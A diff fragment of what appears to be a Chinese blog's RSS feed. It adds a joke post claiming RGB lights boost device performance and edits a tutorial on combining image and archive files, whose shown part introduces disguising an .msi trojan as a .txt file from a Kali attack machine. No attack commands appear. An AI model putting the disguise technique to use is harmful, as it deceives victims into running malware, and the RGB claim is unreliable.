+ @keyframes sentenceFlowFast {
+  0% { background-position: 0% 50%; }
+  100% { background-position: 200% 50%; }
+ }
+ &lt;/style&gt;
+&lt;p&gt;&lt;span class=&#34;rgb-sentence&#34;&gt;RGB灯能显著提升设备性能。&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;以上内容为人民群众劳动生产中的智慧结晶，&lt;font color=&#34;red&#34;&gt; &lt;strong&gt;世界人民大团结万岁！&lt;/strong&gt; &lt;/font&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;strong&gt;来源：图拉丁吧&lt;/strong&gt;&lt;/p&gt;
 </description>
         </item>
         <item>
@@ -316,7 +657,7 @@
 &lt;/div&gt;&lt;p&gt;这样就可以把文件A.jpg和文件B.zip的二进制内容合并了，当我们要把它当作图片打开时就取后缀名&lt;code&gt;.jpg&lt;/code&gt;当我们要把它当作压缩包打开时就取后缀名&lt;code&gt;.zip&lt;/code&gt;这就是有名的 &lt;strong&gt;图种&lt;/strong&gt; ，其原理正是运用了Windows读取到一种文件头就会判断接下来的内容是什么类型，而合并后的文件具有两个文件头，因此其作为图片或压缩包互不干扰。&lt;/p&gt;
 &lt;h3 id=&#34;知识运用&#34;&gt;知识运用
 &lt;/h3&gt;&lt;h4 id=&#34;txt伪装木马&#34;&gt;txt伪装木马
-&lt;/h4&gt;&lt;p&gt;知道了上面的知识，我们是否可以生成一个后缀名为&lt;code&gt;.txt&lt;/code&gt;但实质为&lt;code&gt;.txt&lt;/code&gt;类型的木马呢？让我们试一试。&lt;/p&gt;
+&lt;/h4&gt;&lt;p&gt;知道了上面的知识，我们是否可以生成一个后缀名为&lt;code&gt;.txt&lt;/code&gt;但实质为&lt;code&gt;.msi&lt;/code&gt;类型的木马呢？让我们试一试。&lt;/p&gt;
 &lt;p&gt;打开Kali攻击机：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
